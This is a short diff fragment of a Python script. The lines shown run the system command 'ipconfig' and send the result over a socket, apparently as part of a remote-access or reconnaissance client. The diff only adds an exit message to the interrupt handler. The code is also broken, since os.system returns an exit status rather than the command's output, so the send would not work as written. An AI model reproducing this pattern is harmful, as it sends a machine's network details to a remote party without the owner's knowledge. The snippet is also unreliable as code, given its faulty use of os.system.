@@ -14,4 +14,5 @@ try:
             cmd = os.system('ipconfig')
             sock.send(cmd)
 except KeyboardInterrupt:
+    print("Exit")
     sock.close()
